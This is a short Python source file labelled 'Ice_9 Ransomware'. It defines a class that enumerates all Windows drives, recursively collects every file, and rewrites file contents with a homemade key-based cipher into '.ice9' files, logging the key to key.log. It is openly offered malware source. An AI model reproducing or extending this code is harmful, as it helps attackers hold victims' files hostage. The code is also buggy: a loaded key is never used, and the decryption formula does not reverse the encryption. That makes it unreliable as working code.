'''
 > Code by Icy
 > Ice_9 Ransomware
'''

import os
import random
from xml.etree.ElementPath import ops

class Ice9:
  def __init__(self, search_key_file:str=None,key_length:int=256, extension:str='.ice9', keyfilename:str='key.log') -> None:
    self.key = ''
    self.files = []
    self.key_len = key_length
    self.ext = extension
    self.charset = '0123456789abcdef'
    if search_key_file is None: self.set_key()
    else:
      with open(search_key_file, 'r') as f: key = f.read()
    if not os.path.exists(keyfilename):
      with open(keyfilename, 'x') as f: ...
    with open(keyfilename, 'w') as f: f.write(self.key)
    if os.getcwd()[0] in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ': 
      while(len(os.getcwd()) > 3): os.chdir('..')

  def get_drives(self) -> list:
    drives = [chr(i) + ':' for i in range(65, 91) if os.path.isdir(chr(i) + ':')]
    return drives

  def list_files(self) -> None:
    base_dir = self.get_drives()
    for i in base_dir:
      self.in_dir(i)

  def in_dir(self, dir) -> None:
    for i in os.listdir(dir):
      try:
        if os.path.isfile(os.path.join(dir, i)): self.files.append(os.path.join(dir, i))
        else: self.in_dir(os.path.join(dir, i))
      except PermissionError: ...

  def set_key(self) -> None:
    for i in range(self.key_len):
      ind = random.randint(0, len(self.charset) - 1)
      self.key += self.charset[ind]

  def get_ascii_value(self, character) -> int:
    for i in range(1000):
      if chr(i) == character:
        return i

  def _cut_to_point_reverse(self, string_to_cut:str) -> str:
    ind = 0
    for i in range(len(string_to_cut) - 1, -1, -1):
      if string_to_cut[i] == '.': ind = i; break
    return string_to_cut[0:ind]

  def crypt(self, file:str):
    with open(file, 'r') as f: content = f.read() # Load the content
    extens = file.split('.')[-1] # Get the file extension
    new_ctnt = []
    for i in range(len(content)): new_ctnt.append(['', 0]) # Create the list to be crypted
    j = 0 # Initialize key counter
    for i in range(len(content)):
      while j >= len(self.key):
        j -= len(self.key) # Control key counter
      char_to_crypt_ascii = self.get_ascii_value(content[i]) # Get ASCII value of the char to crypt
      key_char_ascii = self.get_ascii_value(self.key[j]) # Get ASCII value of the key char
      ascii_sum = char_to_crypt_ascii + key_char_ascii # Add the two ascii values
      new_char_ascii = ascii_sum // 3 # Divide the values to get valid character
      new_ctnt[i][0] = chr(new_char_ascii) # Add the char to the list
      new_ctnt[i][1] = chr(ascii_sum % 3) # Add the modulo value of the integer division to the list and convert it to a string
      j += 1
    new_ctnt_str = ''
    for i in new_ctnt: 
      new_ctnt_str += i[0] + i[1]
    if not os.path.exists(self._cut_to_point_reverse(file) + self.ext):
      with open(self._cut_to_point_reverse(file) + self.ext, 'x') as f: ...
    with open(self._cut_to_point_reverse(file) + self.ext, 'w') as f: f.write(new_ctnt_str + '.' + extens)
    
  def decrypt(self, file:str):
    with open(self._cut_to_point_reverse(file) + self.ext, 'r') as f: content = f.read()
    ext = '.' + content.split('.')[-1]
    ctnt = content.split('.')[:-1]
    ctnt = ctnt[0]
    ready_to_dec = []
    for i in range(len(ctnt) // 2): ready_to_dec.append(['',0])
    j = 0
    for i in range(0, len(ctnt), 2): 
      ready_to_dec[j][0] = ctnt[i]
      ready_to_dec[j][1] = ctnt[i + 1]
      j += 1
    k = 0
    final = ''
    for i in range(len(ready_to_dec)):
      while k >= len(self.key):
        k -= len(self.key)
      non_crypted_char = chr(3 * (self.get_ascii_value(ready_to_dec[i][0]) + self.get_ascii_value(ready_to_dec[i][1])) - self.get_ascii_value(self.key[k]))
      final += non_crypted_char
      k += 1
    print(final)

ice = Ice9()
# ice.list_files()
ice.crypt('C:\\Users\\timep\\Bureau\\Desk\\Code\\Ice_9\\a.blurp')
ice.decrypt('C:\\Users\\timep\\Bureau\\Desk\\Code\\Ice_9\\a.ice9')